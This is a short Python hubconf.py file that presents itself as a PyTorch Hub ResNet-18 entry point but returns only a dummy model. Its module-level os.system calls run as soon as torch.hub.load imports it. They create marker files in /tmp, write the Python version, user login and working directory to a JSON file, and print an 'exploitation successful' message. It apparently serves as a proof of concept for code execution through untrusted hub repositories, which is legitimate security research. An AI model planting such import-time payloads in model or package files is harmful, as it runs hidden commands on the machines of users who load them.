import os
import sys

# Define dependencies (needed for hub compatibility)
dependencies = ['torch']

# This is the function that will be called by torch.hub.load
def resnet18(pretrained=False, **kwargs):
    """
    Placeholder function for the model
    """
    # Create a simple object to return
    class DummyModel:
        def __init__(self):
            self.name = "resnet18"
        
        def eval(self):
            return self
            
        def to(self, device):
            return self
    
    return DummyModel()

# This code runs immediately when hubconf.py is imported
# Simple and direct - create a file to prove execution
os.system("touch /tmp/torch_hub_vulnerability_proof.json")
os.system("touch /tmp/torch_hub_compromised")

# For more detailed info, write some system info to the file
os.system(f'echo "{{\\\"python_version\\\": \\\"{sys.version}\\\", \\\"user\\\": \\\"{os.getlogin()}\\\", \\\"cwd\\\": \\\"{os.getcwd()}\\\"}}" > /tmp/torch_hub_vulnerability_proof.json')

print("PyTorch Hub exploitation successful")